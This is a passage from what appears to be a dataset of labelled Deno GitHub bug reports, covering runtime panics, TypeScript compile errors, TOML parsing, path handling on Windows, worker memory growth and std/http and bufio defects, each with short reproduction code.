CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.551 [Information] 4:     0x7ff7554d490f - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.551 [Information] 5:     0x7ff7554d54b7 - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.552 [Information] 6:     0x7ff7554d503f - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.552 [Information] 7:     0x7ff7554f1b10 - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.553 [Information] 8:     0x7ff7554f1963 - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.553 [Information] 9:     0x7ff753f0c616 - <unknown>\r\n2020-06-20T07:11:35.553 [Information] 10:     0x7ff754122eca - <unknown>\r\n2020-06-20T07:11:35.553 [Information] 11:     0x7ff753ec4c83 - <unknown>\r\n2020-06-20T07:11:35.553 [Information] 12:     0x7ff753e6949e - <unknown>\r\n2020-06-20T07:11:35.553 [Information] 13:     0x7ff753f7bf69 - <unknown>\r\n2020-06-20T07:11:35.554 [Information] 14:     0x7ff753eb2724 - <unknown>\r\n2020-06-20T07:11:35.554 [Information] 15:     0x7ff753ffc125 - <unknown>\r\n2020-06-20T07:11:35.554 [Information] 16:     0x7ff753f57160 - <unknown>\r\n2020-06-20T07:11:35.554 [Information] 17:     0x7ff7540e9326 - <unknown>\r\n2020-06-20T07:11:35.554 [Information] 18:     0x7ff7554d56ca - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.559 [Information] 19:     0x7ff753f5b027 - <unknown>\r\n2020-06-20T07:11:35.559 [Information] 20:     0x7ff755503df0 - CrashForExceptionInNonABICompliantCodeRange\r\n2020-06-20T07:11:35.559 [Information] 21:     0x7fff7e5a84d4 - BaseThreadInitThunk\r\n2020-06-20T07:11:35.582 [Information] 22:     0x7fff80cae8b1 - RtlUserThreadStart\r\n```\r\n\r\nAccording to the above stack, it is caused by [this change](https://github.com/denoland/deno/commit/1e0808d501cf9adea65e7cacd123ea4fea06a13a#diff-52a4a7cdf78afa52dbd3506067839baa) in https://github.com/denoland/deno/pull/6126 .\r\n\r\nI think that deno shouldn't panic even if stdin is disabled, because server side application doesn't necessarily require interaction using stdin. \r\n\r\nI would appreciate your comment.\r\n\r\nThanks\r\nHiro\r\n\r\nRelated to https://github.com/anthonychu/azure-functions-deno-worker/issues/13#issuecomment-646988127\r\n/cc @anthonychu"},{"labels":["bug",null,null],"text":"It can be fixed by replacing \"%20\" by \" \" (blank space) in `C:\\Users[user].deno\\bin\\xxx.cmd`. After that it's finally possible to run `xxx` from anywhere.\r\n\r\ndeno 1.1.1\r\nv8 8.5.104\r\ntypescript 3.9.2"},{"labels":["bug",null],"text":"Deno 1.0.5\r\n```\r\n$ deno eval \"Deno.lstatSync('abc:def')\"\r\nerror: Uncaught NotFound: No such file or directory (os error 2)\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:72:10)\r\n    at Object.lstatSync ($deno$/ops/fs/stat.ts:77:15)\r\n    at file:///mnt/f9/tests/__$deno$eval.ts:1:6\r\n```\r\n\r\nDeno 1.1.0\r\n```\r\n$ deno eval \"Deno.lstatSync('abc:def')\"\r\nerror: Uncaught TypeError: Must be a path string or file URL.\r\n    at Object.pathFromURL ($deno$/util.ts:120:13)\r\n    at Object.lstatSync ($deno$/ops/fs/stat.ts:79:10)\r\n    at file:///mnt/f9/tests/__$deno$eval.ts:1:6\r\n```\r\n\r\nThis most likely introduced by #5990 "},{"labels":["bug",null,null],"text":"In the [TOML spec](https://github.com/toml-lang/toml), there is an example of an inline-defined array of inline-defined tables at the end of the \"Array of Tables\" section:\r\n\r\n> You may also use inline tables where appropriate:\r\n> \r\n> ```toml\r\n> points = [ { x = 1, y = 2, z = 3 },\r\n>            { x = 7, y = 8, z = 9 },\r\n>            { x = 2, y = 4, z = 8 } ]\r\n> ```\r\n\r\nHowever this example cannot be parsed with the TOML parser in the stdlib:\r\n\r\n```typescript\r\nimport { parse } from \"https://deno.land/std/encoding/toml.ts\"\r\n\r\nconsole.log(parse(`\r\npoints = [ { x = 1, y = 2, z = 3 },\r\n  { x = 7, y = 8, z = 9 },\r\n  { x = 2, y = 4, z = 8 } ]\r\n`))\r\n```\r\n\r\n```shell\r\n$ deno run test.ts \r\nCompile file:///workspaces/flags/test.ts\r\nerror: Uncaught SyntaxError: Unexpected token '='\r\n    at Parser._parseData (https://deno.land/std/encoding/toml.ts:261:17)\r\n    at Parser._processDeclaration (https://deno.land/std/encoding/toml.ts:190:24)\r\n    at Parser._parseLines (https://deno.land/std/encoding/toml.ts:340:25)\r\n    at Parser.parse (https://deno.land/std/encoding/toml.ts:389:10)\r\n    at parse (https://deno.land/std/encoding/toml.ts:569:33)\r\n    at file:///workspaces/flags/test.ts:3:13\r\n```\r\n\r\nThis example works on other TOML parsers, such as [this online one](https://toml-to-json.matiaskorhonen.fi/).\r\n\r\nI am using Deno 1.1.1."},{"labels":["bug",null],"text":"`deno info [file]` fails when looking at a file in a directory above the current one, example :\r\n`deno info ../index.ts`.\r\n\r\n### Steps to reproduce :\r\n\r\nCreate an index.ts and a subdirectory, and go into it.\r\n\r\n```\r\necho 'console.log(\"hey\");' >> index.ts\r\nmkdir subdir\r\ncd subdir\r\n```\r\nNow if you type :\r\n```\r\ndeno info ../index.ts\r\n```\r\n\r\nYou get :\r\n```\r\nlocal: /Users/username/dev/repro_issue/subdir/../index.ts\r\ntype: TypeScript\r\nCompile file:///Users/username/dev/repro_issue/subdir/../index.ts\r\nerror: TS5012 [ERROR]: Cannot read file 'file:///Users/username/dev/repro_issue/index.ts': AssertionError: Assertion failed..\r\n    at\r\n\r\nTS6053 [ERROR]: File 'file:///Users/username/dev/repro_issue/index.ts' not found.\r\n    at\r\n\r\nFound 2 errors.\r\n```\r\n\r\n`deno run ../index.ts` works fine. I think `deno info` is supposed to be able to find and compile the file as well. Maybe the `..` in the path is messing things up.\r\n\r\n`deno --version`:\r\n```\r\ndeno 1.1.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n```\r\non macOS Catalina"},{"labels":["bug",null],"text":"`deno test` does not completely respect `NO_COLOR=true`. \r\n\r\nI like to run my scripts from within vim, whose command output buffer does not apply ANSI escape codes by default. `deno run` respects `NO_COLOR=true` by not producing ANSI escape codes, but `deno test` still produces some.\r\n\r\n---\r\n\r\n**`deno run`:**\r\n\r\nRunning the following file within vim:\r\n```typescript\r\n#!/usr/bin/env deno run\r\n\r\nif (import.meta.main) {\r\n  console.log('Hello world!');\r\n}\r\n```\r\n\r\nProduces the following output with ANSI escape codes:\r\n```\r\n:!/Users/michaelwm/Development/test.ts\r\n^[[0m^[[38;5;10mCompile^[[0m file:///Users/michaelwm/Development/test.ts\r\nHello world!\r\n```\r\n\r\nAdding `NO_COLOR=true`:\r\n```typescript\r\n#!/usr/bin/env NO_COLOR=true deno run\r\n\r\nif (import.meta.main) {\r\n  console.log('Hello world!');\r\n}\r\n```\r\n\r\nCorrectly produces:\r\n```\r\n:!/Users/michaelwm/Development/test.ts\r\nCompile file:///Users/michaelwm/Development/test.ts\r\nHello world!\r\n```\r\n\r\n---\r\n\r\n**`deno test`:**\r\n\r\nRunning the following file within vim:\r\n```typescript\r\n#!/usr/bin/env deno test\r\n\r\nimport { assertEquals } from 'https://deno.land/std/testing/asserts.ts';\r\n\r\nDeno.test('1 + 1 = 2', () => assertEquals(1 + 1, 2));\r\n```\r\n\r\nProduces output with ANSI escape codes:\r\n```\r\n:!/Users/michaelwm/Development/test.ts\r\n^[[0m^[[38;5;10mCompile^[[0m file:///Users/michaelwm/Development/test.ts\r\nrunning 1 tests\r\ntest 1 + 1 = 2 ... ^[[32mok^[[39m ^[[90m^[[3m(3ms)^[[23m^[[39m\r\n\r\ntest result: ^[[32mok^[[39m. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out ^[[90m^[[3m(3ms)^[[23m^[[39m\r\n```\r\n\r\nAdding `NO_COLOR=true`:\r\n```typescript\r\n#!/usr/bin/env NO_COLOR=true deno test\r\n\r\nimport { assertEquals } from 'https://deno.land/std/testing/asserts.ts';\r\n\r\nDeno.test('1 + 1 = 2', () => assertEquals(1 + 1, 2));\r\n```\r\n\r\nIncorrectly produces:\r\n```\r\n:!/Users/michaelwm/Development/test.ts\r\nCompile file:///Users/michaelwm/Development/test.ts\r\nrunning 1 tests\r\ntest 1 + 1 = 2 ... ^[[32mok^[[39m (10ms)\r\n\r\ntest result: ^[[32mok^[[39m. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out (11ms)\r\n```\r\n\r\nWith the `ok` from test output still surrounded by ANSI escape codes, but all others, such as compilation colors, dropped."},{"labels":["bug",null],"text":"Console output:\r\n```bash\r\nmikuus4@DELL-Inspiron-5548:~/projects/denjucks$ deno run test.ts\r\nerror: No such file or directory (os error 2)\r\nmikuus4@DELL-Inspiron-5548:~/projects/denjucks$ deno run mod.js\r\nCompile file:///home/mikuus4/projects/denjucks/mod.js\r\nmikuus4@DELL-Inspiron-5548:~/projects/denjucks$ deno run test.ts\r\nundefined\r\n```\r\n\r\nLooks like sometimes during compile step, Deno can't access imported files. Especially these with longer tree like: './deps/path/std/path/mod.ts'. \r\n\r\nThe best way to reproduce this error is to clone this repo: [https://github.com/mikolaj6r/deno-error-poc](https://github.com/mikolaj6r/deno-error-poc) and follow steps in readme."},{"labels":["bug",null],"text":"Hi, I am observing that `deno bundle` does not bundle imports that have the `@deno-types` annotation. This may be related to #5665.\r\n\r\n```\r\n// @deno-types=\"https://unpkg.com/rollup@2.16.0/dist/rollup.d.ts\"\r\nimport { rollup } from 'https://unpkg.com/rollup@2.16.0/dist/es/rollup.browser.js'\r\nconsole.log(rollup)\r\n```\r\n\r\n`deno bundle test.js > out.js && deno run out.js`\r\n\r\n```\r\nerror: Uncaught TypeError: Cannot read property 'rollup' of undefined\r\n            console.log(rollup_browser_js_1.rollup);\r\n```\r\n\r\nIf I omit the `@deno-types` annotation, the `out.js` file is significantly larger and it works fine."},{"labels":["bug",null,null],"text":"I have a simple main / worker messaging demo that consumes memory continuously. The below sample will consume > 1GB after 10 minutes.\r\n\r\nOS: Windows 10\r\nEnv: VMWare VM with 4 virtual procs and 32 GB RAM\r\nDeno 1.1.0\r\n\r\nto run: `deno run --allow-read parent.js`\r\n\r\nparent.js\r\n```js\r\nlet worker = new Worker(new URL(\"worker.js\", import.meta.url).href, { type: \"module\" });\r\n\r\nlet struct = {\r\n  headers: [\"database\", 1, 2],\r\n  value: 1\r\n};\r\n\r\nworker.postMessage(struct);\r\n\r\nworker.onmessage = async (e) => {\r\n  let { got, hit } = e.data;\r\n  if (hit) console.log(\"hit: \" + got);\r\n  struct.value = got + 1;\r\n  worker.postMessage(struct);\r\n};\r\n```\r\n\r\nworker.js\r\n```js\r\nlet expected = 12345;\r\n\r\nlet struct = {\r\n  got: null,\r\n  hit: null,\r\n};\r\n\r\nself.onmessage = async (e) => {\r\n  const { value } = e.data;\r\n  if (value % 10000 === 0) console.log(value);\r\n  struct.got = value;\r\n  struct.hit = value === expected;\r\n  postMessage(struct);\r\n};\r\n```"},{"labels":["bug",null],"text":"I've just started with `Deno v1.1`.  \r\nI've tried to create my first class and whenever I try to instance it I get:   \r\n `Uncaught Error: Another accept task is ongoing at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)`\r\nIt happens only if I use MySQL client before but It works if I run any MySQL query before `new MyClass`.\r\n\r\n\r\nMyClass.ts\r\n```javascript\r\nclass MyClass {\r\n   // empty\r\n}\r\nexport default MyClass;\r\n```\r\n\r\nserver.ts\r\n```javascript\r\nimport { Application } from \"https://deno.land/x/oak@v5.2.0/mod.ts\"\r\nimport { Client } from \"https://deno.land/x/mysql/mod.ts\";\r\nimport { APP_HOST, APP_PORT } from \"./config.ts\";\r\nimport router from './routes.ts'\r\nimport MyClass from \"./controllers/myclass.ts\";\r\n\r\nconst app = new Application()\r\n\r\napp.use(router.routes())\r\napp.use(router.allowedMethods())\r\n\r\nconst db = await new Client().connect({\r\n    //...\r\n});\r\n\r\nconst myClass = new MyClass();\r\nawait app.listen(`${APP_HOST}:${APP_PORT}`);\r\n```\r\nI use theese flags:\r\n```\r\ndeno run --allow-env --allow-net server.ts\r\n```\r\n\r\n----\r\n### Env\r\nLinux Mint 19,\r\nDeno 1.1"},{"labels":["bug",null],"text":"[The code that handles disk cache](https://github.com/denoland/deno/blob/0ffc99a61ddfa958a436beef0d003ecead630d0f/cli/disk_cache.rs) is not handling [reserved characters in file paths](https://en.wikipedia.org/wiki/Filename#Reserved_characters_and_words). This issue affects mostly Windows users trying to import a module with a reserved character in the URL like `:`, which is used in https://deno.land/x/ to specify NPM and GitHub imports.\r\n\r\nAn example that fails on Windows:\r\n\r\n```typescript\r\nimport * as html from 'https://deno.land/x/gh:qgustavor:leizm-html-parser/src/lib/index.ts'\r\n```\r\n\r\nCurrent output:\r\n\r\n```\r\nerror: Could not create TypeScript compiler cache location: \"C:\\\\...\\\\deno\\\\gen\\\\https\\\\deno.land\\\\x\\\\gh:qgustavor:leizm-html-parser\\\\src\\\\lib\"\r\nCheck the permission of the directory.\r\n```\r\n\r\nIs possible to workaround this issue by replacing `:` with `%3A` in the URL."},{"labels":["bug",null],"text":"Very similar to https://github.com/denoland/deno/issues/6179 . Deno panics when doing a parallel write to the socket for the \"unixpacket\" transport.\r\n\r\n```\r\nconst socket = Deno.listenDatagram({\r\n  path: \"/tmp/test.sock\",\r\n  transport: \"unixpacket\"\r\n});\r\n\r\nconst a = socket.send(new Uint8Array(), socket.addr);\r\nconst b = socket.send(new Uint8Array(), socket.addr);\r\nawait Promise.all([a, b]);\r\nsocket.close();\r\n```\r\n\r\nResult:\r\n```\r\nthread 'main' panicked at 'already borrowed: BorrowMutError', /rustc/8d69840ab92ea7f4d323420088dd8c9775f180cd/src/libcore/cell.rs:878:9\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```\r\n\r\nCaused by:\r\nhttps://github.com/denoland/deno/blob/0ffc99a61ddfa958a436beef0d003ecead630d0f/cli/ops/net.rs#L216\r\n\r\nThere should be a way to safely borrow the resource in a thread. \r\n"},{"labels":["bug",null],"text":"The lodash-es 4.17.15 module from Pika.dev works in Deno 1.0.5 but in 1.1 it is no longer working.\r\n\r\nGiven the following source:\r\n\r\n```typescript\r\nimport * as lodash from \"https://cdn.pika.dev/lodash-es@^4.17.15\";\r\n\r\nconsole.log(Object.keys(lodash));\r\n```\r\n\r\nProduces 2000+ errors like the following:\r\n\r\n```\r\nTS2304 [ERROR]: Cannot find name 'PropertyPath'.\r\n        property<TObj, TResult>(path: PropertyPath): (obj: TObj) => TResult;\r\n                                      ~~~~~~~~~~~~\r\n    at https://cdn.pika.dev/-/lodash@v4.17.15-tkkpAVjO4KoPJf4n82iC/dist=es2019,mode=types/common/util.d.ts:1032:39\r\n\r\nTS2304 [ERROR]: Cannot find name 'PropertyPath'.\r\n        propertyOf<T extends {}>(object: T): (path: PropertyPath) => any;\r\n                                                    ~~~~~~~~~~~~\r\n    at https://cdn.pika.dev/-/lodash@v4.17.15-tkkpAVjO4KoPJf4n82iC/dist=es2019,mode=types/common/util.d.ts:1059:53\r\n\r\nTS2304 [ERROR]: Cannot find name 'PropertyPath'.\r\n        propertyOf(): LoDashImplicitWrapper<(path: PropertyPath) => any>;\r\n                                                   ~~~~~~~~~~~~\r\n    at https://cdn.pika.dev/-/lodash@v4.17.15-tkkpAVjO4KoPJf4n82iC/dist=es2019,mode=types/common/util.d.ts:1066:52\r\n\r\nTS2304 [ERROR]: Cannot find name 'PropertyPath'.\r\n        propertyOf(): LoDashExplicitWrapper<(path: PropertyPath) => any>;\r\n                                                   ~~~~~~~~~~~~\r\n    at https://cdn.pika.dev/-/lodash@v4.17.15-tkkpAVjO4KoPJf4n82iC/dist=es2019,mode=types/common/util.d.ts:1073:52\r\n\r\nTS2498 [ERROR]: Module '\"https://cdn.pika.dev/-/lodash@v4.17.15-tkkpAVjO4KoPJf4n82iC/dist=es2019,mode=types/index\"' uses 'export =' and cannot be used with 'export *'.\r\nexport * from '/-/lodash@v4.17.15-tkkpAVjO4KoPJf4n82iC/dist=es2019,mode=types/index.d.ts';\r\n              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    at https://cdn.pika.dev/lodash/dist=es2019,mode=types/index.d.ts:23:15\r\n\r\nFound 2073 errors.\r\n```"},{"labels":["bug",null],"text":"\r\n```\r\n> RUST_BACKTRACE=1 deno run --allow-net --unstable https://gist.githubusercontent.com/alexanderson1993/d75444f026ed8344aefa6700ba426430/raw/293fd38fb4e9bf4fff5d81a7a918c9753d0b5f34/index.tsx\r\nVisit http://localhost:8000\r\nthread 'main' panicked at 'Can't downcast ErrBox(JSError(JSError { message: \"Uncaught AssertionError: Assertion failed.\", source_line: None, script_resource_name: Some(\"$deno$/util.ts\"), line_number: Some(35), start_column: Some(10), end_column: Some(11), frames: [JSStackFrame { type_name: Some(\"Object\"), function_name: Some(\"assert\"), method_name: Some(\"assert\"), file_name: Some(\"$deno$/util.ts\"), line_number: Some(35), column_number: Some(11), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(11) }, JSStackFrame { type_name: None, function_name: Some(\"buildLocalSourceFileCache\"), method_name: None, file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(536), column_number: Some(5), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(5) }, JSStackFrame { type_name: None, function_name: Some(\"runtimeCompile\"), method_name: None, file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(1245), column_number: Some(3), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(3) }, JSStackFrame { type_name: Some(\"global\"), function_name: Some(\"tsCompilerOnMessage\"), method_name: Some(\"onmessage\"), file_name: Some(\"$deno$/compiler.ts\"), line_number: Some(1364), column_number: Some(22), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(22) }, JSStackFrame { type_name: None, function_name: Some(\"workerMessageRecvCallback\"), method_name: None, file_name: Some(\"$deno$/runtime_worker.ts\"), line_number: Some(72), column_number: Some(33), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(33) }, JSStackFrame { type_name: Some(\"global\"), function_name: None, method_name: None, file_name: Some(\"file:///Users/rld/src/deno/__anonymous__\"), line_number: Some(1), column_number: Some(1), eval_origin: None, is_top_level: None, is_eval: false, is_native: false, is_constructor: false, is_async: false, is_promise_all: false, promise_index: Some(1) }], formatted_frames: [\"Object.assert ($deno$/util.ts:35:11)\", \"buildLocalSourceFileCache ($deno$/compiler.ts:536:5)\", \"runtimeCompile ($deno$/compiler.ts:1245:3)\", \"tsCompilerOnMessage ($deno$/compiler.ts:1364:22)\", \"workerMessageRecvCallback ($deno$/runtime_worker.ts:72:33)\", \"file:///Users/rld/src/deno/__anonymous__:1:1\"] })) to OpError', cli/op_error.rs:422:9\r\nstack backtrace:\r\n```"},{"labels":["bug",null],"text":"Consider this (contrived) example, `echo.ts`, which uses the `cat` binary to print `stdin`:\r\n\r\n```ts\r\nexport const echo = async (data: string): Promise<void> => {\r\n  const runOpts: Deno.RunOptions = {\r\n    cmd: ['cat'],\r\n    stdin: 'piped',\r\n  };\r\n\r\n  const p = Deno.run(runOpts);\r\n\r\n  if (!p.stdin) throw new Error('stdin not available');\r\n  await p.stdin.write(new TextEncoder().encode(`${data}\\n`));\r\n  p.stdin.close();\r\n\r\n  const {success} = await p.status();\r\n  if (!success) throw new Error('Process encountered an error');\r\n\r\n  p.close();\r\n}\r\n\r\nconst main = (): void => {\r\n  const text = Deno.args.join(' ') || 'hello world';\r\n  echo(text);\r\n};\r\n\r\nif (import.meta.main) main();\r\n\r\nexport default echo;\r\n```\r\n\r\nIt compiles and runs using Deno v1.0.5:\r\n\r\n```shell\r\n> deno --version\r\ndeno 1.0.5\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n> deno run --allow-run echo.ts\r\nhello world\r\n```\r\n\r\nbut in Deno v1.1.0, this TypeScript compilation error occurs:\r\n\r\n```shell\r\n> deno --version\r\ndeno 1.1.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n> deno run --allow-run echo.ts\r\nCompile file:///mnt/path/redacted/for/privacy/echo.ts\r\nerror: TS2531 [ERROR]: Object is possibly 'null'.\r\n  await p.stdin.write(new TextEncoder().encode(`${data}\\n`));\r\n        ~~~~~~~\r\n    at file:///mnt/path/redacted/for/privacy/echo.ts:10:9\r\n\r\nTS2531 [ERROR]: Object is possibly 'null'.\r\n  p.stdin.close();\r\n  ~~~~~~~\r\n    at file:///mnt/path/redacted/for/privacy/echo.ts:11:3\r\n\r\nFound 2 errors.\r\n```\r\n\r\nI see that the type definition has changed from 1.0.5 to 1.1.0:\r\n\r\n[1.0.5 `lib.deno.d.ts`](https://github.com/denoland/deno/releases/download/v1.0.5/lib.deno.d.ts#L1744):\r\n```ts\r\nexport class Process {\r\n    readonly rid: number;\r\n    readonly pid: number;\r\n    readonly stdin?: Writer & Closer;\r\n```\r\n\r\n[1.1.0 `lib.deno.d.ts`](https://github.com/denoland/deno/releases/download/v1.1.0/lib.deno.d.ts#L1782):\r\n```ts\r\nexport class Process<T extends RunOptions = RunOptions> {\r\n    readonly rid: number;\r\n    readonly pid: number;\r\n    readonly stdin: T[\"stdin\"] extends \"piped\" ? Writer & Closer : null;\r\n```\r\n"},{"labels":["bug",null],"text":"The chunked response handling in `std/http` seems to be very broken. When you give it a `Reader`, it's supposed to send a chunked response, but it throws an error after only a few megabytes of data.\r\n\r\nBelow is a script to reproduce this. If `image.jpg` is very small, it'll work fine. Interestingly, the amount of data that actually gets sent to the client seems to be somewhat erratic. Sometimes I get ~4 megabytes, sometimes I get < 2 megabytes. Maybe backpressure isn't working properly?\r\n\r\n```ts\r\nimport * as http from 'https://deno.land/std@v0.56.0/http/server.ts';\r\n\r\nconst respond = async (request: http.ServerRequest) => {\r\n    const file = await Deno.open('./image.jpg');\r\n    await request.respond({\r\n        body   : file,  // works if file is very small, but throws an error if it's a bit large (>4MB ???)\r\n        status : 200\r\n    });\r\n    file.close();\r\n};\r\n\r\nfor await (const request of http.serve({ port : 3000 })) {\r\n    respond(request);\r\n}\r\n```\r\n\r\n### Stack trace\r\n\r\n```ts\r\nerror: Uncaught Error: Short write\r\n      this.err = new Error(\"Short write\");\r\n                 ^\r\n    at BufWriter.checkBytesWritten (https://deno.land/std@v0.56.0/io/bufio.ts:436:18)\r\n    at BufWriter.flush (https://deno.land/std@v0.56.0/io/bufio.ts:487:10)\r\n    at async BufWriter.write (https://deno.land/std@v0.56.0/io/bufio.ts:518:9)\r\n    at async writeChunkedBody (https://deno.land/std@v0.56.0/http/_io.ts:171:5)\r\n    at async writeResponse (https://deno.land/std@v0.56.0/http/_io.ts:267:5)\r\n    at async ServerRequest.respond (https://deno.land/std@v0.56.0/http/server.ts:88:7)\r\n    at async respond (file:///Users/sholladay/Code/personal/pogo/server.ts:5:5)\r\n```\r\n\r\n### Environment\r\n\r\nOS: macOS 10.14.6\r\n\r\n```\r\n$ deno --version\r\ndeno 1.0.2\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n```\r\n\r\nI am also able to reproduce this on Deno 1.0.5."},{"labels":["bug",null],"text":"Runtime\r\n```\r\ndebian 10\r\ndeno 1.1.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n```\r\n------\r\n\r\n```ts\r\n//a.ts\r\nimport(\"./b.ts\").catch(e=>{\r\n  console.log(\"caught import b.ts error\")\r\n  console.error(e)\r\n})\r\n\r\nimport(\"./c.ts\").catch(e=>{\r\n  console.log(\"caught import c.ts error\")\r\n  console.error(e)\r\n})\r\n```\r\n```ts\r\n//b.ts\r\n// @ts-ignore\r\nimport \"./b1.ts\";\r\nexport default () => \"error\";\r\n```\r\n```ts\r\n//c.ts\r\n// @ts-ignore\r\nawait import(\"./c1.ts\");\r\nexport default () => \"error\";\r\n```\r\n\r\ncreate those files and then run `deno run --allow-read=. a.ts`, you will get log like below:\r\n```\r\ncaught import b.ts error\r\nTypeError: Cannot resolve module \"file:///yourdir/b1.ts\" from \"file:///yourdir/b.ts\"\r\n\r\nerror: Uncaught TypeError: Cannot resolve module \"file:///yourdir/c1.ts\" from \"file:///yourdir/c.ts\"\r\n```\r\n\r\n`import('./c.ts')` error should be caught, but it doesn't, and this error make my program exit\r\n"},{"labels":["bug",null],"text":"The unstable doc shows `{certificate, hostname, port}` as a snippet in https://doc.deno.land/https/raw.githubusercontent.com/denoland/deno/master/cli/js/lib.deno.unstable.d.ts#Deno.startTls.\r\n\r\n[port is likely not needed for Deno.startTls]\r\n\r\nHowever, https://doc.deno.land/https/raw.githubusercontent.com/denoland/deno/master/cli/js/lib.deno.unstable.d.ts#Deno.StartTlsOptions only has `{certificate, hostname}`.\r\n\r\nAlso - for client certificate authentication, the client certificate, key, and a ca certificate will be required (for self-signed cert conditions).\r\n"},{"labels":["bug",null],"text":"Deno bundles javascript files with query parameters as typescript\r\n\r\nIf I run the following it works fine:\r\n\r\n```\r\ndeno bundle https://unpkg.com/lit-html@1.2.1/lit-html.js lit-html.bundle.js\r\n```\r\n\r\n```\r\nBundling https://unpkg.com/lit-html@1.2.1/lit-html.js\r\nEmitting bundle to \"lit-html.bundle.js\"\r\n65445 bytes emitted.\r\n```\r\n\r\nBut if I try to use [UNPKG](https://unpkg.com) ES6 module resolution with the ```?module``` query parameter which replaces bare import specifiers with absolute URLs I get an error.\r\n\r\n```\r\ndeno bundle https://unpkg.com/lit-html/lit-html.js?module lit-html.bundle.js\r\n\r\nTS7019 [ERROR]: Rest parameter 'values' implicitly has an 'any[]' type.\r\nexport const svg = (strings, ...values) => new SVGTemplateResult(strings, values, 'svg', defaultTemplateProcessor);\r\n                             ~~~~~~~~~\r\n    at https://unpkg.com/lit-html@1.2.1/lit-html.js?module:59:30\r\n\r\nFound 229 errors.\r\n```\r\n\r\nThis particular package doesn't actually need the the ```?module``` query parameter as all modules it uses are referenced using relative paths, but an example where it would be necessary is ```lit-element``` which uses ```lit-html```.\r\n\r\n```\r\ndeno bundle https://unpkg.com/lit-element/lit-element.js lit-element.bundle.js\r\n\r\n  Bundling https://unpkg.com/lit-element/lit-element.js\r\n  error: relative import path \"lit-html/lib/shady-render.js\" not prefixed with / or ./ or \r\n../ Imported from \"https://unpkg.com/lit-element@2.3.1/lit-element.js\"\r\n```\r\n\r\nSupporting query strings would also allow for other arguments to be passed to modules as part of the ```import.meta.url``` property like shown [here](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import.meta)\r\n\r\n```javascript\r\n// index.mjs\r\nimport './index2.mjs?someURLInfo=5';\r\n\r\n// index2.mjs\r\nnew URL(import.meta.url).searchParams.get('someURLInfo'); // 5\r\n```\r\n\r\n\r\n\r\n\r\n\r\n\r\n"},{"labels":["bug",null],"text":"The following fails, but should pass:\r\n\r\n```ts\r\nimport { BufWriter } from \"https://deno.land/std@0.56.0/io/bufio.ts\";\r\nimport { StringWriter } from \"https://deno.land/std@0.56.0/io/writers.ts\";\r\nimport { assertEquals } from \"https://deno.land/std@0.56.0/testing/asserts.ts\";\r\n\r\nconst test = Deno.test;\r\n\r\ntest({\r\n  name: \"defect with writer\",\r\n  async fn() {\r\n    const stringWriter = new StringWriter();\r\n    const bufWriter = new BufWriter(stringWriter);\r\n    const encoder = new TextEncoder();\r\n    await bufWriter.write(encoder.encode(\"hello\\nworld\\nhow\\nare\\nyou?\\n\\n\"));\r\n    await bufWriter.flush();\r\n    await bufWriter.write(encoder.encode(\"foobar\\n\\n\"));\r\n    await bufWriter.flush();\r\n    const actual = stringWriter.toString();\r\n    assertEquals(actual, \"hello\\nworld\\nhow\\nare\\nyou?\\n\\nfoobar\\n\\n\");\r\n  },\r\n});\r\n```\r\n\r\nThe expected output should be:\r\n\r\n```\r\nhello\r\nworld\r\nhow\r\nare\r\nyou?\r\n\r\nfoobar\r\n\r\n```\r\n\r\nThe actual output is:\r\n\r\n```\r\nfoobar\r\n\r\nrld\r\nhow\r\nare\r\nyou?\r\n\r\nfoobar\r\n\r\n```\r\n\r\nSomehow the second write is being written into both chunks within the `StringWriter`."},{"labels":["bug",null],"text":"Probably broken in https://github.com/denoland/deno/pull/6129\r\n\r\nExample:\r\nhttps://github.com/denoland/deno/pull/6202/checks?check_run_id=753888116\r\n\r\nRunning locally `tools/format.py` doesn't change any files.\r\n\r\nI added two debug statements:\r\n```python\r\ndef prettier():\r\n    script = os.path.join(third_party_path, \"node_modules\", \"prettier\",\r\n                          \"bin-prettier.js\")\r\n    source_files = get_sources(root_path, [\"*.js\", \"*.json\", \"*.ts\", \"*.md\"])\r\n    if source_files:\r\n        max_command_length = 24000\r\n        while len(source_files) > 0:\r\n            print \"debug\"\r\n            command = [\"node\", script, \"--write\", \"--loglevel=error\", \"--\"]\r\n            while len(source_files) > 0:\r\n                command.append(source_files.pop())\r\n                if len(\" \".join(command)) > max_command_length:\r\n                    run(command, shell=False, quiet=True)\r\n                    print \"debug1\"\r\n                    break\r\n\r\n```\r\n\r\nIt yields:\r\n```\r\n▶ ./tools/format.py --js\r\nasdf\r\nasdf1\r\nasdf\r\n```\r\n\r\nCC @MarkTiedemann 